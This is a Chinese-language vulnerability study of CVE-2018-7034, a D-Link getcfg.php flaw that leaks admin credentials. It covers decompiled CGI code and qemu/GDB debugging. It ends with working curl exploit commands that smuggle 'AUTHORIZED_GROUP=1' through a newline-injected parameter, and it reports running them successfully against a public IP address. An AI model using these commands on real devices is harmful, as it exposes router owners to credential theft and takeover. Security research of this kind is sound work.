#### 分析

CVE-2018-7034，D-Link 登录信息泄露（权限绕过）漏洞

存在漏洞的文件是 `/htdocs/web/getcfg.php`：

![img](https://raw.githubusercontent.com/soskong/Image/main/Screenshot%202026-03-06%20160841.png)

如果实现

```
CACHE = False
$AUTHORIZED_GROUP >= 0
```

就可以执行 `/htdocs/webinc/getcfg/".$GETCFG_SVC.".xml.php` 文件

查找 `/htdocs/webinc/getcfg/` 目录下的文件，执行 `DEVICE.ACCOUNT.xml.php` 可泄露后台账号密码

![img](https://raw.githubusercontent.com/soskong/Image/main/Screenshot%202026-03-06%20171521.png)

cache为ture时输出一个SESSION_ID，表示有无用户登录，实际上只要考虑 `$AUTHORIZED_GROUP >= 0` 即可

在php代码文件中找不到 `$AUTHORIZED_GROUP` 的定义，说明其可能通过二进制文件解析的url

查找后 `/home/i/iot/dlink/d815/squashfs-root/htdocs/cgibin` 中有该字符串

先看main函数分析入口![img](https://raw.githubusercontent.com/soskong/Image/main/Screenshot%202026-03-10%20190359.png)我们知道argc指针数组，第一个参数是当前可执行文件的绝对路径，剩余的是命令行参数

这段代码实际上是将文件名赋予v3变量，跟据文件名的值执行对应文件，但是本文件名就是cgibin，如何执行这些分支，初步猜测是通过链接创建对应文件名，执行对应函数

 当前文件名为phpcgi时，执行phpcgi_main函数，并将原始的命令行参数传给phpcgi_main

```c
int __fastcall phpcgi_main(int a1, int a2, _DWORD *a3)
{
    int v5; // $s0
    _DWORD *v6; // $s1
    _DWORD *v7; // $v0
    _DWORD *i; // $s0
    char *v9; // $v0
    const char *v10; // $s0
    int (__fastcall *v11)(int, int *); // $a0
    FILE *v12; // $v0
    int v13; // $v0
    int string; // $v0
    int v16; // [sp+1Ch] [-1Ch]
    int v17[6]; // [sp+20h] [-18h] BYREF

    // 除了当前文件名，还需要第二个参数
    if (a1 < 2)
    {
        v5 = -1;
        v6 = 0;
        goto LABEL_21;	// go to end
    }

    v7 = sobj_new();	//v7是指向0x18大小的4byte数组，数组的第一个和第二个元素都是数组自己所在的地址
    v6 = v7;
    if (!v7)
        goto LABEL_20;	// go to end

    // 将命令行参数及环境变量加入上下文
    sobj_add_string(v7, *(_DWORD *)(a2 + 4));
    sobj_add_char(v6, 10); 

    for (i = a3; *i; ++i)
    {
        sobj_add_string(v6, "_SERVER_");
        sobj_add_string(v6, *i);
        sobj_add_char(v6, 10);
    }

    // 根据 HTTP 请求方法选择不同的解析回调函数
    v9 = getenv("REQUEST_METHOD");
    v10 = v9;
    if (!v9)
        goto LABEL_20;

    // 处理 GET/HEAD 的分支
    if (!strcasecmp(v9, "HEAD") || !strcasecmp(v10, "GET"))
    {
        v11 = sub_405CF8; 
        goto LABEL_13;
    }


    if (strcasecmp(v10, "POST"))
    {
LABEL_20:
        v5 = -1;
        goto LABEL_21;
    }
    // POST处理
    v11 = (int (__fastcall *)(int, int *))sub_405AC0; 
LABEL_13:

    // 解析请求
    v5 = cgibin_parse_request(v11, v6, 0x80000);
  
    if (v5 >= 0)
    {
        //身份验证：校验 Session 并设置 AUTHORIZED_GROUP
        v13 = sess_validate(); 
        sprintf((char *)v17, "AUTHORIZED_GROUP=%d", v13);
  
        sobj_add_string(v6, v17);
        sobj_add_char(v6, 10);
  
        sobj_add_string(v6, "SESSION_UID=");
        sess_get_uid(v6);
        sobj_add_char(v6, 10);

        // 将构造好的数据交给 xmldbc_ephp 解析执行真正的 PHP 逻辑
        string = sobj_get_string(v6);
        v5 = xmldbc_ephp(0, 0, string, stdout);
    }
    else if (v5 == -100)
    {
        // 请求过长错误处理
        v12 = fopen("/htdocs/web/info.php", "r");
        if (v12)
        {
            fclose(v12);
            cgibin_print_http_resp(1, (int)"/info.php", 
		"FAIL", "ERR_REQ_TOO_LONG", 0, (int)"", 0x43B790, v16, v17[0], (_BYTE *)v17[1]);
        }
    }
    else
    {
        cgibin_print_http_status(400, "unsupported HTTP request", "unsupported HTTP request");
    }

LABEL_21:
    // 释放
    cgibin_clean_tempfiles();
    if (v6)
        sobj_del(v6);
    return v5;
}
```

#### 动态分析

创建完sobj对象后![img](https://raw.githubusercontent.com/soskong/Image/main/1773390641664.png)执行完 `sobj_add_string(v7, *(_DWORD *)(a2 + 4));`，9个a为第二个参数，还不能确定 `sobj_add_string`的功能![img](https://raw.githubusercontent.com/soskong/Image/main/1773390578758.png)执行完 `sobj_add_char(v6, 10);`，加了一个换行符![img](https://raw.githubusercontent.com/soskong/Image/main/1773390878046.png)执行完for循环后，把每个环境变量加了一个 `_SERVER_`的前缀，添加到sobj对象中![img](https://raw.githubusercontent.com/soskong/Image/main/1773391888185.png)![](https://raw.githubusercontent.com/soskong/Image/main/1773391927942.png)接下来执行 `v5 = cgibin_parse_request(v11, v6, 0x80000);`

![](https://raw.githubusercontent.com/soskong/Image/main/1773395067533.png)网上看了别人的分析，都说在cgibin_parse_request的while循环中 通过回调 调用了post处理函数，实际上分析，是在parse_uri中调用了该函数。

如果进入while循环，那么cgibin_parse_request将返回-1，无法进入xmldbc_ephp所在分支

![img](https://raw.githubusercontent.com/soskong/Image/main/1773420894729.png)s动态分析sobj（v6）在parse_uri调用前后变化，之前：

![1773421102015](image/dlink信息泄露登录后台/1773421102015.png)

parse_uri中，第二个sub_403864中调用了post处理函数

![1773421322932](image/dlink信息泄露登录后台/1773421322932.png)

parse_uri调用完后：![img](https://raw.githubusercontent.com/soskong/Image/main/1773421423850.png)parse_uri返回0后，进入到 `if ( v8 >= 0 )`分支，a3为0x8000(sobj的最大长度限制)，v7为 `CONTENT_LENGTH` 的值，v7 超过0x8000字节（没试过）或者v7=0都可以避免cgibin_parse_request的返回值为-1，所以调试时把 `CONTENT_LENGTH` 的值改为0，或者就是不加 `CONTENT_LENGTH`变量，v7也为0，这样就可以使cgibin_parse_request的返回值为0

从cgibin_parse_request返回后，得到了为0的返回值进入 `if ( v5 >= 0 )` 分支，由于sess_validate中缺失 `/var/session/sesscfg`文件，而且会进入死循环，patch掉，粗略看一下，假设失败，sess_validate会返回-1，同时设置下返回值$v0=-1![](https://raw.githubusercontent.com/soskong/Image/main/1773452807268.png)

string变量为

![](https://raw.githubusercontent.com/soskong/Image/main/1773452839318.png)可以看到URI请求的参数被拼接到了最后，而且由于我们自己传的AUTHORIZED_GROUP覆盖截取了之后添加的AUTHORIZED_GROUP，AUTHORIZED_GROUP变量被改写为1

string作为一个字符串参数传入 `xmldbc_ephp(0, 0, string, (int)stdout)`，就是从名字上看执行php代码的意思，最终执行到了![](https://raw.githubusercontent.com/soskong/Image/main/1773455727768.png)

sub_411BCC是一个创建本地socket与/var/run/xmldb_sock的函数，成功后返回套接字，sub_411CB0用于写入/var/run/xmldb_sock，通过与xmldb交互来响应http，这个路由器貌似通过自研的xml守护进程来处理各种数据库的读写

`/usr/sbin/xmldb`中注册了一些回调来处理![](https://raw.githubusercontent.com/soskong/Image/main/1773475967675.png)![](https://raw.githubusercontent.com/soskong/Image/main/1773475967675.png)初步学习，分析这里确实麻烦，但这并不影响整体流程

由于AUTHORIZED_GROUP被修改为1，在getcfg.php中利用成功输出了后台账户密码

#### 模拟固件

启动命令为

```
// v5返回-1
REQUEST_METHOD=POST REQUEST_URI="http://192.168.0.110/getcfg.php?SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1" CONTENT_TYPE="application/x-www-form-urlencoded" CONTENT_LENGTH="200" qemu-mipsel -L . -g 9999 -0 phpcgi ./htdocs/cgibin aaaaaaaaa 

// v5返回0，两条都可
REQUEST_METHOD=POST REQUEST_URI="http://192.168.0.110/getcfg.php?SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1" CONTENT_TYPE="application/x-www-form-urlencoded" qemu-mipsel -L . -g 9999 -0 phpcgi ./htdocs/cgibin aaaaaaaaa 

REQUEST_METHOD=POST REQUEST_URI="http://192.168.0.110/getcfg.php?SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1" CONTENT_TYPE="application/x-www-form-urlencoded" CONTENT_LENGTH="0" qemu-mipsel -L . -g 9999 -0 phpcgi ./htdocs/cgibin aaaaaaaaa 
```

gdb中

```
set architecture mips
set endian little
set sysroot /home/i/iot/dlink/d815/squashfs-root
file /home/i/iot/dlink/d815/squashfs-root/htdocs/cgibin
target remote localhost:9999

b *0x00...0
```

#### 本地&远程

上面提到的

![](https://raw.githubusercontent.com/soskong/Image/main/1773476968571.png)v8一定为0（只要传入URI参数），如果不进入while（即Content-length为0），可以达成返回值为0，后续的xmlbc_ephp可以正常执行

cmd执行 `curl -d "" "http://174.104.16.176:8080/getcfg.php?SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1"`，抓一下利用成功的包![](https://raw.githubusercontent.com/soskong/Image/main/1773404781491.png)

如果content_length不为0，进入while，cgibin_parse_request的返回值在本地会出问题、调试时会顿三四秒然后返回-1，导致直接跳转cgibin_print_http_status输出报错信息了，而在远程，执行

`curl -d "SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1" "http://174.104.16.176:8080/getcfg.php"`

数据包![](https://raw.githubusercontent.com/soskong/Image/main/1773477892204.png)总的来说，远程哪一条都可以，本地要content_length为0

#### 疑问

实现了利用，但是对于Mathopd服务器如何接受处理http请求，这些文件如何通过xmldb_sock本地套接字通信，php页面由谁渲染，都还不太清除
